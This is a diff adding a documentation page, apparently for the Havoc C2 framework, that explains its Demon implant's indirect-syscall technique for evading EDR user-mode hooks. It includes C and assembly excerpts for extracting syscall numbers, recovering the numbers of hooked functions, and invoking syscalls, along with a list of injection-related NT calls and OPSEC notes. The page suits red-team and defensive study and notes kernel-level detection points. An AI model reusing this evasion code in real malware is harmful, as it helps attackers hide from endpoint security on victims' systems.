@@ -1,0 +1,216 @@
+---
+title: Indirect syscalls
+description: Deep dive into Havoc's indirect syscall implementation for EDR evasion
+icon: shield-halved
+---
+
+## Overview
+
+Havoc implements indirect syscalls to evade user-mode hooks placed by EDRs and security products. Instead of calling `syscall` instructions directly from hooked NTDLL functions, Havoc extracts the syscall instruction address from a clean function and invokes it indirectly.
+
+<Info>
+  Indirect syscalls bypass user-mode hooks by avoiding hooked function prologues while still using legitimate syscall instructions from NTDLL.
+</Info>
+
+## How It Works
+
+### Syscall Extraction
+
+During initialization, Havoc extracts two critical pieces of information from NTDLL:
+
+1. **System Service Number (SSN)**: The syscall number for each NT function
+2. **Syscall Instruction Address**: Location of a clean `syscall` instruction
+
+**Source**: `payloads/Demon/src/core/Syscalls.c:12`
+
+```c
+BOOL SysInitialize(IN PVOID Ntdll) {
+    PVOID SysNativeFunc   = NULL;
+    PVOID SysIndirectAddr = NULL;
+
+    // Resolve syscall instruction from dummy NT function
+    if ((SysNativeFunc = LdrFunctionAddr(Ntdll, H_FUNC_NTADDBOOTENTRY))) {
+        // Extract the address of the syscall instruction
+        SysExtract(SysNativeFunc, TRUE, NULL, &SysIndirectAddr);
+        
+        if (SysIndirectAddr) {
+            Instance->Syscall.SysAddress = SysIndirectAddr;
+        }
+    }
+}
+```
+
+### SSN Extraction Process
+
+The `SysExtract` function parses NTDLL function stubs to extract SSNs:
+
+**Source**: `payloads/Demon/src/core/Syscalls.c:90`
+
+```c
+BOOL SysExtract(IN PVOID Function, IN BOOL ResolveHooked, 
+                OUT PWORD Ssn, OUT PVOID* SysAddr) {
+    // Look for the pattern:
+    // mov r10, rcx      (4C 8B D1)
+    // mov eax, [ssn]    (B8 XX XX XX XX)
+    if (DREF_U8(Function + Offset + 0x0) == 0x4C &&
+        DREF_U8(Function + Offset + 0x1) == 0x8B &&
+        DREF_U8(Function + Offset + 0x2) == 0xD1 &&
+        DREF_U8(Function + Offset + 0x3) == 0xB8) {
+        
+        // Extract SSN from bytes 4 and 5
+        SsnLow  = DREF_U8(Function + Offset + SSN_OFFSET_1);
+        SsnHigh = DREF_U8(Function + Offset + SSN_OFFSET_2);
+        *Ssn    = (SsnHigh << 0x08) | SsnLow;
+    }
+}
+```
+
+### Hook Detection & Evasion
+
+If a function is hooked, Havoc uses neighboring syscalls to calculate the correct SSN:
+
+**Source**: `payloads/Demon/src/core/Syscalls.c:201`
+
+```c
+BOOL FindSsnOfHookedSyscall(IN PVOID Function, OUT PWORD Ssn) {
+    UINT32 SyscallSize = GetSyscallSize();
+    
+    for (UINT32 i = 1; i < 500; ++i) {
+        // Try syscall above ours
+        NeighbourSyscall = C_PTR(U_PTR(Function) + (SyscallSize * i));
+        if (SysExtract(NeighbourSyscall, FALSE, &NeighbourSsn, NULL)) {
+            *Ssn = NeighbourSsn - i;  // Calculate our SSN
+            return TRUE;
+        }
+        
+        // Try syscall below ours
+        NeighbourSyscall = C_PTR(U_PTR(Function) - (SyscallSize * i));
+        if (SysExtract(NeighbourSyscall, FALSE, &NeighbourSsn, NULL)) {
+            *Ssn = NeighbourSsn + i;  // Calculate our SSN
+            return TRUE;
+        }
+    }
+}
+```
+
+<Warning>
+  This technique assumes syscall numbers are incremental. On older Windows versions or with significant NTDLL modifications, this may fail.
+</Warning>
+
+## Assembly Implementation
+
+The actual syscall invocation is performed in assembly:
+
+**Source**: `payloads/Demon/src/asm/Syscall.x64.asm`
+
+```asm
+SysSetConfig:
+    mov r11, rcx     ; Store syscall config pointer in r11
+    ret
+
+SysInvoke:
+    mov r10, rcx              ; First argument (standard syscall convention)
+    mov eax, [r11 + 0x8]      ; Load SSN from config into eax
+    jmp QWORD [r11]           ; Jump to clean syscall instruction
+    ret
+```
+
+### Execution Flow
+
+1. **Configuration**: `SysSetConfig` stores the syscall configuration (SSN + instruction address)
+2. **Invocation**: `SysInvoke` loads the SSN and jumps to the clean `syscall` instruction
+3. **Execution**: The CPU executes the syscall using the correct SSN
+4. **Return**: Execution returns to Havoc code
+
+## Supported Syscalls
+
+Havoc extracts SSNs for the following NT functions during initialization:
+
+**Source**: `payloads/Demon/src/core/Syscalls.c:43`
+
+<Accordion title="Full Syscall List">
+```c
+SYS_EXTRACT(NtOpenThread)
+SYS_EXTRACT(NtOpenThreadToken)
+SYS_EXTRACT(NtOpenProcess)
+SYS_EXTRACT(NtTerminateProcess)
+SYS_EXTRACT(NtOpenProcessToken)
+SYS_EXTRACT(NtDuplicateToken)
+SYS_EXTRACT(NtQueueApcThread)
+SYS_EXTRACT(NtSuspendThread)
+SYS_EXTRACT(NtResumeThread)
+SYS_EXTRACT(NtCreateEvent)
+SYS_EXTRACT(NtCreateThreadEx)
+SYS_EXTRACT(NtDuplicateObject)
+SYS_EXTRACT(NtGetContextThread)
+SYS_EXTRACT(NtSetContextThread)
+SYS_EXTRACT(NtQueryInformationProcess)
+SYS_EXTRACT(NtQuerySystemInformation)
+SYS_EXTRACT(NtWaitForSingleObject)
+SYS_EXTRACT(NtAllocateVirtualMemory)
+SYS_EXTRACT(NtWriteVirtualMemory)
+SYS_EXTRACT(NtReadVirtualMemory)
+SYS_EXTRACT(NtFreeVirtualMemory)
+SYS_EXTRACT(NtUnmapViewOfSection)
+SYS_EXTRACT(NtProtectVirtualMemory)
+SYS_EXTRACT(NtTerminateThread)
+SYS_EXTRACT(NtAlertResumeThread)
+SYS_EXTRACT(NtSignalAndWaitForSingleObject)
+SYS_EXTRACT(NtQueryVirtualMemory)
+SYS_EXTRACT(NtQueryInformationToken)
+SYS_EXTRACT(NtQueryInformationThread)
+SYS_EXTRACT(NtQueryObject)
+SYS_EXTRACT(NtClose)
+SYS_EXTRACT(NtSetEvent)
+SYS_EXTRACT(NtSetInformationThread)
+SYS_EXTRACT(NtSetInformationVirtualMemory)
+SYS_EXTRACT(NtGetNextThread)
+```
+</Accordion>
+
+## EDR Evasion Benefits
+
+### Bypasses User-Mode Hooks
+
+EDRs typically hook NTDLL functions by modifying the first few bytes:
+
+```
+Hooked NtAllocateVirtualMemory:
+  jmp hook_handler   ; Jump to EDR code
+  
+Clean NtAllocateVirtualMemory:
+  mov r10, rcx       ; Original code
+  mov eax, 0x18      ; SSN
+  syscall            ; Execute
+```
+
+Havoc's indirect syscalls skip the hooked prologue entirely.
+
+### Kernel Callback Visibility
+
+<Warning>
+  While indirect syscalls bypass user-mode hooks, they do NOT evade kernel-mode callbacks. EDRs using kernel drivers can still detect these syscalls via:
+  - `PsSetCreateProcessNotifyRoutine`
+  - `PsSetCreateThreadNotifyRoutine`
+  - `ObRegisterCallbacks`
+  - Kernel ETW providers
+</Warning>
+
+## OPSEC Considerations
+
+1. **Memory Scanning**: The syscall configuration stored in memory may be detected
+2. **Call Stack Analysis**: Stack traces will show unusual call patterns
+3. **Telemetry**: Kernel callbacks still fire for all operations
+4. **Thread Context**: Some EDRs inspect thread start addresses and call stacks
+
+## Related Techniques
+
+- [Token Management](/advanced/token-management) - Uses indirect syscalls for token operations
+- [.NET Execution](/advanced/dotnet-execution) - Combines with AMSI bypass
+- Stack spoofing for return address manipulation
+
+## References
+
+- Syscall extraction: `payloads/Demon/src/core/Syscalls.c`
+- Assembly stubs: `payloads/Demon/src/asm/Syscall.x64.asm`
+- Configuration: `payloads/Demon/include/core/Syscalls.h`
